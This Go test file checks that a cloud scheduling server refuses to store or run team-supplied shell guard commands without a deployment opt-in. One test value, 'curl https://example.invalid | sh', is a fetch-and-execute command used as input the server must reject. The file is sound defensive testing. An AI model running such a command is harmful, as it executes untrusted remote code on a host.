package server

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/SocialGouv/iterion/pkg/cloudsched"
	"github.com/SocialGouv/iterion/pkg/schedgate"
	"github.com/SocialGouv/iterion/pkg/store"
)

func newCloudScheduleTestServer(t *testing.T) *Server {
	t.Helper()
	t.Setenv(envCloudScheduleGuards, "")
	s := newScheduleTestServer(t)
	s.cfg.Mode = "cloud"
	return s
}

// A cloud server refuses to store a team's schedule guard — a shell command it
// would run in its own pod — unless the deployment opted in.
func TestCloudScheduleGuardsAreRefusedAtWrite(t *testing.T) {
	s := newCloudScheduleTestServer(t)
	ctx := superAdminCtx()
	create := func(body string) *httptest.ResponseRecorder {
		w := httptest.NewRecorder()
		s.handleCreateSchedule(w, scheduleReq(ctx, "POST", "/api/teams/t1/schedules", body, "t1", ""))
		return w
	}
	if w := create(`{"bot_id":"a","cron":"0 * * * *","guard":"gh pr list | grep -q ."}`); w.Code != http.StatusUnprocessableEntity {
		t.Fatalf("create with a guard = %d %s, want 422", w.Code, w.Body.String())
	}
	w := create(`{"bot_id":"a","cron":"0 * * * *"}`)
	if w.Code != http.StatusCreated {
		t.Fatalf("create without a guard = %d %s, want 201", w.Code, w.Body.String())
	}
	var created cloudsched.ScheduledBot
	if err := json.Unmarshal(w.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}
	w = httptest.NewRecorder()
	s.handleUpdateSchedule(w, scheduleReq(ctx, "PATCH", "/api/teams/t1/schedules/"+created.ID, `{"guard":"true"}`, "t1", created.ID))
	if w.Code != http.StatusUnprocessableEntity {
		t.Fatalf("a patch setting a guard = %d %s, want 422", w.Code, w.Body.String())
	}

	// A row that carries a guard from before: the edit dialog sends the whole
	// policy back, stored guard included. Refusing on PRESENCE would refuse
	// every edit of exactly the rows the exemption is for.
	stored := cloudsched.ScheduledBot{ID: "sb-legacy", TenantID: "t1", BotID: "a", Cron: "0 * * * *", Guard: "true"}
	if err := s.cfg.ScheduledBots.Create(store.WithTenant(context.Background(), "t1"), stored); err != nil {
		t.Fatal(err)
	}
	w = httptest.NewRecorder()
	s.handleUpdateSchedule(w, scheduleReq(ctx, "PATCH", "/api/teams/t1/schedules/sb-legacy", `{"disabled":true,"guard":"true"}`, "t1", "sb-legacy"))
	if w.Code != http.StatusOK {
		t.Fatalf("pausing a schedule that holds a guard, with the guard sent back unchanged = %d %s, want 200", w.Code, w.Body.String())
	}
	w = httptest.NewRecorder()
	s.handleUpdateSchedule(w, scheduleReq(ctx, "PATCH", "/api/teams/t1/schedules/sb-legacy", `{"guard":"curl https://example.invalid | sh"}`, "t1", "sb-legacy"))
	if w.Code != http.StatusUnprocessableEntity {
		t.Fatalf("a patch CHANGING the guard = %d %s, want 422", w.Code, w.Body.String())
	}

	t.Setenv(envCloudScheduleGuards, "allow")
	if w := create(`{"bot_id":"a","cron":"0 * * * *","guard":"true"}`); w.Code != http.StatusCreated {
		t.Fatalf("with the deployment's opt-in, create with a guard = %d %s, want 201", w.Code, w.Body.String())
	}
}

// A schedule that carries a guard from before the refusal stays editable —
// pausing it must keep working — and its guard never runs in the server: the
// tick is refused, with the reason on the audit record.
func TestACloudScheduleGuardNeverRunsInTheServer(t *testing.T) {
	s := newCloudScheduleTestServer(t)
	ctx := superAdminCtx()
	marker := filepath.Join(t.TempDir(), "guard-ran")

	// The row is written while the deployment allowed guards, then the opt-in
	// is withdrawn: the shape of a schedule stored before the refusal.
	t.Setenv(envCloudScheduleGuards, "allow")
	w := httptest.NewRecorder()
	s.handleCreateSchedule(w, scheduleReq(ctx, "POST", "/api/teams/t1/schedules",
		`{"bot_id":"a","cron":"0 * * * *","guard":"touch `+marker+`"}`, "t1", ""))
	if w.Code != http.StatusCreated {
		t.Fatalf("seed a guarded schedule = %d %s", w.Code, w.Body.String())
	}
	var created cloudsched.ScheduledBot
	if err := json.Unmarshal(w.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}
	t.Setenv(envCloudScheduleGuards, "")

	w = httptest.NewRecorder()
	s.handleUpdateSchedule(w, scheduleReq(ctx, "PATCH", "/api/teams/t1/schedules/"+created.ID, `{"disabled":true}`, "t1", created.ID))
	if w.Code != http.StatusOK {
		t.Fatalf("pausing a guarded schedule = %d %s, want 200", w.Code, w.Body.String())
	}

	ok, _, rec := s.cloudScheduleGate(context.Background(), created)
	if ok {
		t.Fatal("the gate fired a schedule whose guard it refused")
	}
	if rec.Decision != schedgate.TickGuardError || !strings.Contains(rec.Reason, envCloudScheduleGuards) {
		t.Errorf("tick record = %s %q, want guard_error naming the opt-in", rec.Decision, rec.Reason)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("the guard ran in the server")
	}

	t.Setenv(envCloudScheduleGuards, "allow")
	s.cloudScheduleGate(context.Background(), created)
	if _, err := os.Stat(marker); err != nil {
		t.Fatalf("with the deployment's opt-in the guard did not run (%v): the refusal above proves nothing", err)
	}
}
